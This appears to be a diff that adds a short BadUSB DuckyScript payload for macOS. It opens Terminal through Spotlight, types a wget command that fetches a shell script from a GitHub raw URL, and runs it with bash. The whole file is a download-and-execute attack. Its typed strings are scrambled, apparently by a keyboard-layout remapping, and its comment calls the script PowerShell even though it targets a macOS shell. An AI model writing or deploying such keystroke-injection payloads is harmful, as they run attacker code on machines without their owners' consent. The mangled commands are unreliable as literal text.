@@ -1,0 +1,18 @@
+REM This Badusb will download a powershell script from a github raw and execute it, 
+
+REM Open macos terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING ter;inql
+DELAY 500
+ENTER
+DELAY 750
+
+
+STRING zget https.>>rqz<githubusercontent<co;>Sn)zQlice>Flip6Her6)>;qin>bqdusb>scripts>;)@>dl<sh
+ENTER
+DELAY 750
+
+STRING bqsh <>dl<sh
+ENTER
